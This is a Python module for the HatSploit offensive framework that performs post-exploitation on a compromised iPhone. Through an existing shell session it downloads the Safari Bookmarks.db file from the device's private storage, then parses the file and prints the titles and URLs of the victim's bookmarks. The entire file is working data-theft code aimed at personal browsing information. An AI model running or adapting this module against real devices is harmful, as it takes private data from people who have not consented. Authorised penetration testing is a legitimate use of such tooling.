"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.loot import Loot
from hatsploit.lib.core.module.basic import *

from pex.db import DB


class HatSploitModule(Module):
    def __init__(self):
        super().__init__({
            'Category': "post",
            'Name': "Obtain Safari bookmarks",
            'Module': "post/apple_ios/shell/safari_bookmarks",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
            ],
            'Description': "Get iOS Safari bookmarks database and parse it.",
            'Platform': OS_IPHONE,
            'Rank': MEDIUM_RANK,
        })

        self.session = SessionOption('SESSION', None, "Session to run on.", True,
                                     platforms=[OS_IPHONE], type='shell')
        self.path = Option('PATH', Loot().specific_loot('Bookmarks.db'), "Path to save file.", True)

    def run(self):
        bookmarks = '/private/var/mobile/Library/Safari/Bookmarks.db'
        path = self.session.session.download(bookmarks, self.path.value)

        if path:
            self.print_process("Parsing bookmarks database...")

            try:
                bookmarks = DB().parse_safari_bookmarks(path)
            except Exception:
                self.print_error("Failed to parse bookmarks database!")
                return

            bookmarks_data = []
            for item in bookmarks:
                bookmarks_data.append((item['title'], item['url']))

            if bookmarks_data:
                self.print_table("Bookmarks", ('Title', 'URL'), *bookmarks_data)
            else:
                self.print_warning("No bookmarks available on device.")
